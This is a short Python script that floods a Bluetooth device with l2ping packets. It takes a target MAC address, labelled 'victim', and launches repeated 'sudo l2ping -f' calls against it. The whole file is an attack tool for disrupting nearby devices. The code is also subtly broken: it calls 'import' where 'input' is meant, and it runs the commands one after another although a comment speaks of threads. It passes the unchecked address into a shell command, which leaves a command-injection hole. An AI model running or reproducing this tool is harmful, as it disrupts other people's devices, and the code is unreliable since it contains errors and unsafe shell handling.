#!/usr/bin/env python
import subprocess
from time import sleep

victim = import("MAC: ")

try:
    # 30 - threads number
    for i in range(1, 30):
        xterm = "sudo l2ping -i hci0 -s 10 -f " + victim
        process = subprocess.Popen(xterm, stderr=subprocess.PIPE, shell=True)
        data = process.communicate()
        print(i)
        print(data)
except(KeyboardInterrupt, OSError):
    print("Exit.")
